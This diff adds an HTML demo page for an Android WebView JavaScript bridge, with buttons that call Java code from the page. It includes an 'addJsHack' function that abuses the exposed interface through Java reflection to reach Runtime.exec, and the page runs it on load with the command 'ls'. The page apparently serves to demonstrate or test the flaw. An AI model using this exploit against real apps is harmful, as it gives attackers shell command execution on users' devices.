@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>louie.wang</title>
+
+    <script type="text/javascript">
+
+        function javaCallJsWith(arg){
+            document.getElementById("content").innerHTML = (arg);
+        }
+
+        function javaCallJsEvaluate(arg){
+            document.getElementById("content").innerHTML = (arg);
+
+            return "Return Result Very Good!!!"
+        }
+    </script>
+
+    <script>
+         function callAndroid(){
+            test.hello();
+         }
+
+         function callAndroidWith(){
+            test.hello("js带参数调用android中的代码");
+         }
+
+         function callAndroidByUrl(){
+            /*约定的url协议为：js://webview?arg1=111&arg2=222*/
+            document.location = "js://webview?arg1=111&arg2=222";
+         }
+
+         function clickPrompt(){
+             var result = prompt("js://demo?arg1=111&arg2=222");
+             alert("demo " + result);
+       }
+
+       function addJsHack(cmdArgs) {
+            test.hello();
+            console.log(obj);
+            console.log(obj.getClass());
+
+            for (var obj in window) {
+                console.log(obj);
+                try {
+                    if ("getClass" in window[obj]) {
+                        try {
+                            window[obj].getClass().forName("java.lang.Runtime").
+                            getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);;
+                        } catch (e) {
+
+                            }
+                        }
+                    } catch (e) {
+                }
+            }
+       }
+
+       addJsHack()
+    </script>
+</head>
+
+<body>
+    <h1>It works!</h1>
+    <br/>
+    <button type="button" id="button1" onclick="addJsHack()">js调用android中的代码</button>
+    <br/>
+    <button type="button" id="button2" onclick="callAndroidWith()">js带参数调用android中的代码</button>
+    <br/>
+    <button type="button" id="button3" onclick="callAndroidByUrl()">js通过URL调用Android代码</button>
+    <br/>
+    <button type="button" id="button4" onclick="clickPrompt()">js通过onJsAlert调用Android代码</button>
+    <br/>
+
+    <script>
+        addJsHack("ls");
+    </script>
+    <h1><div id="content">Hello World</div></h1>
+</body>
+</html>
